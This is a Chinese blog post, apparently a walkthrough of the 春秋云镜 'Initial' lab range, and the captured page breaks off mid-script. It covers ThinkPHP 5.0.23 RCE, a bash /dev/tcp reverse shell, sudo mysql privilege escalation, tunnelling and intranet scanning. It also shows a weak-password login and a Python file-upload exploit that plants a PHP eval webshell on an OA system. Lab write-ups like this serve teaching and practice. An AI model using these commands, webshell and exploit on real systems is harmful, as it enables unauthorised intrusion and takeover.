@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="准备目标靶机ip为：39.101.163.148   flag1对目标靶机进行端口扫描，我这里采用kali的masscan对ip进行全端口扫描。 1masscan -p 0-65535 39.101.163.148 --rate&#x3D;1000  这玩意扫太快了，好像不怎么准，老老实实用nmap或者其他工具吧。  访问web端口，很明显的ThinkPHP的标志。  进行目录扫描，好像没什么东西。  找不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Initial">
+<meta property="og:url" content="http://example.com/2024/12/02/Initial/index.html">
+<meta property="og:site_name" content="Mash1r0&#39;Blog">
+<meta property="og:description" content="准备目标靶机ip为：39.101.163.148   flag1对目标靶机进行端口扫描，我这里采用kali的masscan对ip进行全端口扫描。 1masscan -p 0-65535 39.101.163.148 --rate&#x3D;1000  这玩意扫太快了，好像不怎么准，老老实实用nmap或者其他工具吧。  访问web端口，很明显的ThinkPHP的标志。  进行目录扫描，好像没什么东西。  找不">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/Initial.assets/1733128835399-58cb1276-3c3e-41f6-ba3c-e01bb90c52ad.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733123102971-a9eb6bbd-0132-4d10-8a5e-e2595d09887f.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733123476633-4b6a5df8-7d33-49a3-9784-bcbdef8c0877.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733128883807-ffe526a7-2203-4b81-b015-495d8045550a.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733123695751-7ec626d0-a3f3-4545-9e33-bc68da6e2bbd.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733123744936-434a1899-685e-4233-b66f-62168875481a.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733123807425-e6c2ef7c-562a-4bc4-8a9f-dfa12afb19bb.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733124068075-a7b6673d-f638-4e2e-84b1-4c7489b79645.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733124105461-489dc669-e71f-4e8f-b48a-5534f1c643de.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733124183067-f6c5ed6f-2493-4c24-aca6-c3634dddd2f8.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733124515984-82abcdb5-36d1-4d63-a85f-4e3f07763eb2.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733124311671-2e8a0682-5a26-43c2-ad49-45f4556ac27e.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733124370370-101fd6b9-4d93-4e05-a0c9-8c00f353c88f.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733125181171-1c0b698a-ce41-455b-81c7-10c3c1fff89c.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733124485389-9261d31d-e7da-46e2-a056-8d5f637caf75.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733125363202-aef51ba1-d9b0-45c9-8f98-6d18a52ca6f0.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733125584712-26fad8fe-82d3-4335-ab99-0da116885448.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733125798725-ab8c2148-740c-4718-b981-fbc68dcfc59d.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733126447798-45616ec4-a0d6-4ac5-a9c1-992191245307.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733126638277-fcd97759-1f2a-46db-b55f-5f9c01bc5eab.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733128284741-176771cd-5f31-4310-bb7d-d8c8430e9c5e.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733128193243-d7bc8685-7479-4dca-a596-21f1e80c2751.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733128372462-b965f366-7374-4f9c-b252-d4c0f39a532e.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733129989565-9bf52769-6f19-48af-a5ae-48ceb082895b.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733130211722-cb158ee7-732a-4d71-aa5b-7079214c5b75.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733130294558-be925a4a-6ddf-4fd1-a2fb-3a0333da08ca.png">
+<meta property="og:image" content="http://example.com/Initial.assets/1733131103037-e26b4df6-5bfc-4eae-a2bf-414a35d1e55c.png">
+<meta property="article:published_time" content="2024-12-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-13T15:27:54.912Z">
+<meta property="article:author" content="Mash1r0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/Initial.assets/1733128835399-58cb1276-3c3e-41f6-ba3c-e01bb90c52ad.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云镜-Initial</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-0796%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/12/02/Initial/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/12/02/Initial/&text=春秋云镜-Initial"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/12/02/Initial/&is_video=false&description=春秋云镜-Initial"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Initial&body=Check out this article: http://example.com/2024/12/02/Initial/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/12/02/Initial/&title=春秋云镜-Initial"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/12/02/Initial/&name=春秋云镜-Initial&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/12/02/Initial/&t=春秋云镜-Initial"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云镜-Initial
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mash1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-01T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-12-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>目标靶机ip为：39.101.163.148  </p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>对目标靶机进行端口扫描，我这里采用kali的masscan对ip进行全端口扫描。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p 0-65535 39.101.163.148 --rate=1000</span><br></pre></td></tr></table></figure>
+
+<p>这玩意扫太快了，好像不怎么准，老老实实用nmap或者其他工具吧。</p>
+<p><img src="/./Initial.assets/1733128835399-58cb1276-3c3e-41f6-ba3c-e01bb90c52ad.png" alt="img"></p>
+<p>访问web端口，很明显的ThinkPHP的标志。</p>
+<p><img src="/./Initial.assets/1733123102971-a9eb6bbd-0132-4d10-8a5e-e2595d09887f.png" alt="img"></p>
+<p>进行目录扫描，好像没什么东西。</p>
+<p><img src="/./Initial.assets/1733123476633-4b6a5df8-7d33-49a3-9784-bcbdef8c0877.png" alt="img"></p>
+<p>找不到版本号，尝试用fscan进行扫描，或者直接用ThinkPHP工具尝试梭哈。</p>
+<p><img src="/./Initial.assets/1733128883807-ffe526a7-2203-4b81-b015-495d8045550a.png" alt="img"></p>
+<p>扫描到tp 5.0.23 rce的漏洞。</p>
+<p><img src="/./Initial.assets/1733123695751-7ec626d0-a3f3-4545-9e33-bc68da6e2bbd.png" alt="img"></p>
+<p>直接用工具去getshell，蚁剑连接即可。也可以手动去拿payload去打。</p>
+<p><img src="/./Initial.assets/1733123744936-434a1899-685e-4233-b66f-62168875481a.png" alt="img"></p>
+<p><img src="/./Initial.assets/1733123807425-e6c2ef7c-562a-4bc4-8a9f-dfa12afb19bb.png" alt="img"></p>
+<p>蚁剑成功连接。尝试反弹shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/7777 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Initial.assets/1733124068075-a7b6673d-f638-4e2e-84b1-4c7489b79645.png" alt="img"></p>
+<p>尝试提权，先试试suid。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Initial.assets/1733124105461-489dc669-e71f-4e8f-b48a-5534f1c643de.png" alt="img"></p>
+<p>可以看到这里的mysql可以sudo无密码使用，我们上网站查看利用手法。</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! /bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Initial.assets/1733124183067-f6c5ed6f-2493-4c24-aca6-c3634dddd2f8.png" alt="img"></p>
+<p>成功提权，记得前面是开过ssh端口，我们可以尝试把root密码进行修改，然后ssh进行连接。使用 passwd root进行修改。</p>
+<p><img src="/./Initial.assets/1733124515984-82abcdb5-36d1-4d63-a85f-4e3f07763eb2.png" alt="img"></p>
+<p>然后尝试ssh连接。</p>
+<p><img src="/./Initial.assets/1733124311671-2e8a0682-5a26-43c2-ad49-45f4556ac27e.png" alt="img"></p>
+<p>好像有公私钥，我们还是直接用吧。</p>
+<p>在&#x2F;root&#x2F;flag目录下面有一个flag01.txt，我们可以读到。</p>
+<p><img src="/./Initial.assets/1733124370370-101fd6b9-4d93-4e05-a0c9-8c00f353c88f.png" alt="img"></p>
+<p>第一段flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>先搭建隧道，我直接用stowaway。</p>
+<p>vps：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin -l 8888 -s 123</span><br></pre></td></tr></table></figure>
+
+<p>靶机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -c ip:8888 -s 123</span><br></pre></td></tr></table></figure>
+
+<p>选择节点，配置socks5</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"></span><br><span class="line">socks 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Initial.assets/1733125181171-1c0b698a-ce41-455b-81c7-10c3c1fff89c.png" alt="img"></p>
+<p>接着配置kali和网页的代理为vps+port就行了。</p>
+<p>我们再来查看一下所处网段。</p>
+<p>ip a 或者 ifconfig</p>
+<p><img src="/./Initial.assets/1733124485389-9261d31d-e7da-46e2-a056-8d5f637caf75.png" alt="img"></p>
+<p>我们先尝试挂完代理访问内网的ip。</p>
+<p><img src="/./Initial.assets/1733125363202-aef51ba1-d9b0-45c9-8f98-6d18a52ca6f0.png" alt="img"></p>
+<p>能访问代表成功挂上。我们再进行内网信息收集，先上个fscan，用蚁剑就行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.1.0/24（-np）&gt;&gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>跳过存活探测（-np）</strong>：<code>-np</code> 参数用于跳过对目标主机的存活探测，即不进行 ICMP 或 TCP 连接尝试来判断主机是否在线。这可以减少扫描过程中的网络流量和潜在的检测风险  </p>
+<p>这个没有回显，我们保存到文件查看。</p>
+<details class="lake-collapse"><summary id="u84752955"><span class="ne-text">1.txt</span></summary><p id="u5b1a26d7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start infoscan</span></p><p id="u7dc4b8a1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">trying RunIcmp2</span></p><p id="ua9939993" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">The current user permissions unable to send icmp packets</span></p><p id="u63f87a32" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start ping</span></p><p id="u74ed0436" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.2      is alive</span></p><p id="ub46a68c2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.21     is alive</span></p><p id="u4bc8abb0" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.18     is alive</span></p><p id="u03ff7646" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.15     is alive</span></p><p id="u97f2c706" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] Icmp alive hosts len is: 4</span></p><p id="u7b25797e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:3306 open</span></p><p id="u637fc3a8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:445 open</span></p><p id="u30a7a909" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.21:445 open</span></p><p id="u3e61c488" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:445 open</span></p><p id="u12a1ca5d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:80 open</span></p><p id="u409a7a2b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.15:80 open</span></p><p id="u084abd94" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:139 open</span></p><p id="u4ce18599" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.21:139 open</span></p><p id="ue104177a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:139 open</span></p><p id="ua97e9b87" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.15:22 open</span></p><p id="uac9d14b8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:135 open</span></p><p id="u6e831a1d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.21:135 open</span></p><p id="u4e2f1005" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:135 open</span></p><p id="uc6c06b4b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.15:10001 open</span></p><p id="u57be1799" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:88 open</span></p><p id="u9c7ffac4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] alive ports len is: 15</span></p><p id="u2a4e47ec" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start vulscan</span></p><p id="u71a07617" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetInfo </span></p><p id="u1907e843" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*]172.22.1.18</span></p><p id="ued6667e1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]XIAORANG-OA01</span></p><p id="u8d2bb32b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]172.22.1.18</span></p><p id="u570bce29" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetInfo </span></p><p id="ucd3b9a16" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*]172.22.1.21</span></p><p id="u083b117b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]XIAORANG-WIN7</span></p><p id="u497273f9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]172.22.1.21</span></p><p id="u1f17be4f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetInfo </span></p><p id="u4600679c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*]172.22.1.2</span></p><p id="ud08737e8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]DC01</span></p><p id="u52f44992" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]172.22.1.2</span></p><p id="uf55ed2c5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393)</span></p><p id="u9ee9a749" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[+] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span></p><p id="u049e7578" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span></p><p id="u2a8d62b2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span></p><p id="uda812edc" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] WebTitle </span><span class="ne-text">http://172.22.1.15</span><span class="ne-text">        code:200 len:5578   title:Bootstrap Material Admin</span></p><p id="u2ed2a24b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] WebTitle </span><span class="ne-text">http://172.22.1.18</span><span class="ne-text">        code:302 len:0      title:None 跳转url: </span><span class="ne-text">http://172.22.1.18?m=login</span></p><p id="u22a9082f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span></p><p id="ub2ccf27d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] WebTitle </span><span class="ne-text">http://172.22.1.18?m=login</span><span class="ne-text"> code:200 len:4012   title:信呼协同办公系统</span></p><p id="u1ef7be89" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[+] PocScan </span><span class="ne-text">http://172.22.1.15</span><span class="ne-text"> poc-yaml-thinkphp5023-method-rce poc1</span></p><p id="u3c7997ff" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">已完成 15/15</span></p><p id="u2224f65d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] 扫描结束,耗时: 11.07034237s</span></p></details>
+
+<p>直接ai分析吧，懒得看了。</p>
+<p><img src="/./Initial.assets/1733125584712-26fad8fe-82d3-4335-ab99-0da116885448.png" alt="img"></p>
+<p>有四个存活主机，这里15是我们已经拿下了的主机，然后在18上面有一个办公系统，2为DC域控，21存在永恒之蓝漏洞，看样子是域成员。</p>
+<p>然后ai分析的NetBios信息如下。</p>
+<p><img src="/./Initial.assets/1733125798725-ab8c2148-740c-4718-b981-fbc68dcfc59d.png" alt="img"></p>
+<p>我们先尝试打办公系统（172.22.1.18），再从另一台的永恒之蓝（172.22.1.21）入手。</p>
+<p><img src="/./Initial.assets/1733126447798-45616ec4-a0d6-4ac5-a9c1-992191245307.png" alt="img"></p>
+<p>访问之后可以看到对应的版本号2.2.8。</p>
+<p>弱口令 <strong>admin:admin123</strong>，在poc库里面可以找到一个任意文件上传漏洞。</p>
+<p><img src="/./Initial.assets/1733126638277-fcd97759-1f2a-46db-b55f-5f9c01bc5eab.png" alt="img"></p>
+<p>在里面直接给出了python的poc脚本。</p>
+<p>我们首先需要在poc.py同级目录下面创建一个1.php文件，上马就行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php为webshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要修改以下内容：</span></span><br><span class="line"><span class="comment"># url_pre = &#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span></span><br><span class="line"><span class="comment"># &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"><span class="comment"># url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span>    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + <span 